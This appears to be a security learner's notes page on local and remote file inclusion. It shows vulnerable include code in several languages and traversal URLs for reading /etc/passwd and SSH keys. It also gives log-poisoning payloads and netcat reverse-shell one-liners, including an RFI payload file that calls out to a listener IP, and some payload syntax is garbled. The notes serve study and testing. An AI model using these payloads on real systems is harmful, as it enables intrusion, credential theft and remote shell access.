---
title: Notes | LFI
author: Zeropio
date: 2022-04-23
categories: [Notes, Vulnerabilities]
tags: [lfi]
permalink: /notes/vulnerabilities/lfi
---


# Local file inclusion
**LFI** is the process to include files locate in the server through the exploiting of vulnerable inclusion. The most common place we usually find LFI within is templating engines, for example `/index.php?page=about`. Where `index.php` sets static content and the parameter `page` dinamically. LFI vulnerabilities can lead to source code disclosure, sensitive data exposure, and even remote code execution under certain conditions.

Some examples of insecure code:
- PHP 

```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```

- NodeJS 

```javascript
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
```

- Express.js 

```javascript
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```

- Java 

```jsp
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
```

- .NET 

```cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}
```
```cs
@Html.Partial(HttpContext.Request.Query['language'])
```
```cs
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```

## Read vs Execute

There are a difference in these functions between read and execute. Some of the above functions **only read** the content of the specified files, while others also **execute** the specified files:

| **Function**    | **Read content**   | **Execute**    | **Remote URL** |
|---------------- | --------------- | --------------- | -------------- |
| **PHP** |     
| `include()`/`include_once()` | <ul><li>- [x]</li></ul> | - [x] | - [x] | 
| `require()`/`require_once()` | - [x] | - [x] | - [ ] |
| `file_get_contents()` | - [x] | - [ ] | - [x] |
| `fopen()`/`file()` | - [x] | - [ ] | - [ ] |

For example:
```
http://localhost/example.php?file=../../../../../../../etc/passwd
http://localhost/example.php?file=../../../../../../windows/system32/drivers/etc/hosts
```

With the terminal we can check easily:
```console
> curl -s "http://localhost/example.php?file=/etc/passwd"
```
##### **-s**: no verbose

We can check some important files:
- **/home/user/.ssh/id_rsa ->** check credentials for a ssh connection, with **ssh2john** we can break any ssh password if its weak or we have it in a dictionary.
- **/proc/sched_debug ->**  show many running scripts
- **/proc/net/fib_trie ->** check network interfaces (with *grep -i  "host local" -B 1* we can get local ip).
- **/proc/net/tcp ->** check port. The last four digits from the second column (rem_address), if we add a **0x** in Python before we can get the port (its common to not get ports like 80 here).

###  Directory Path Traversal
If the web is sanitaze with only one path allowed, we can move using **../**:
```console
> curl -s "http://localhost/example.php?file=../../../../../../../etc/passwd"
```

The web can set and extension to the end of the path, we can escape than with: **%00** at the end of the search.

#### Wrappers
Help to escape LFI sanitazer. For example:
- **?file=file:///etc/passwd ->** get the file.
- **?file=php:///filter/convert.base64-encode/resource=file.php ->** give all the content file (including comments) in base64 (useful to get the whole source code).

###  Log Poisoning
Change logs in order to recreate a RCE.

#### Reverse Shell
We can execute code accesing **/proc/self/environ**. We can modify the header in burpsuite to add:
```php
<?passthru('nc -e /bin/bash <ip> <port>');?>
```
To execute the reverse shell.

#### Apache2
In **/var/log/apache2/access.log** we can manipulate the user agent that the log is currently saving in the logs with curl. For example:
```console
> curl -s -H "User-Agent: <¿php system('whoami'); ?>" "http://localhost/example.php?file=/var/log/apache2/access.log"
```
Now we can execute code in the system.

Also, we can try to login (for example with ssh). **auth.log** will save the login attempt, if we execute the page after the login we will execute the script.
##### Maybe we need to encode the payload to base64

Another example is the **/var/log/auth.log**. We can try to log in by ssh with and invalid user and see that all the trys are been saving in the log.
If we log as a command, execute the log (loading with curl or in the web with LFI) we can execute the command and get a **reverse shell**:
- First we encode the connection (with netcat).
```console
> echo 'nc -e /bin/bash 127.0.0.1:443' | base64; echo
  bmMgLWUgL2Jpbi9iYXNoIDEyNy4wLjAuMTo0NDMK
```
- Then we send this "user" to the log:
```console
> ssh '<¿php system("echo bmMgLWUgL2Jpbi9iYXNoIDEyNy4wLjAuMTo0NDMK | base64 -d | bash"); ?>'@127.0.0.1 
```
Then we will try to log in with any password. Now we just need to reload the log in the web, then the code is executed.
```console
> curl -s -H "User-Agent: <¿php system('whoami'); ?>" "http://localhost/example.php?file=/var/log/auth.log"
```


# Remote File Inclusion (RFI)
Load files into the server.

We can create a plain file (**.txt**) with a php content:
```php
<?php
  passthru('nc -e /bin/sh 192.168.1.134 9000');
?>
```

Then we change the url with:
```
...?index=http://<ip>/revershell.txt
```
And then we can execute code.
